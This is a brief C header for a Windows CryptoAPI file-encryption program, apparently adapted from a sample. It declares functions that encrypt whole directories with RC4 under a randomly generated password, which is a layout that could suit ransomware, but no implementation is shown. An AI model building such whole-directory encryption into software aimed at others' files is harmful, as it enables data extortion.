#pragma once
// Encrypting_a_File.cpp : Defines the entry point for the console 
// application.
//

#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
#include <fileapi.h>
#include <WinBase.h>

// Link with the Advapi32.lib file.
#pragma comment (lib, "advapi32")

#define KEYLENGTH  0x00800000
#define ENCRYPT_ALGORITHM CALG_RC4 
#define ENCRYPT_BLOCK_SIZE 8 


void MyHandleError(LPTSTR psz, int nErrorNumber);

struct directory {
	WCHAR* directoryName;
	struct directory* Next;
};

void encryptDirectory(const WCHAR directory_path[]);
void randomStrGenerator(char* rand_str);
DWORD encryptFile(LPCWSTR soureFile, LPCWSTR destFile, LPCWSTR password);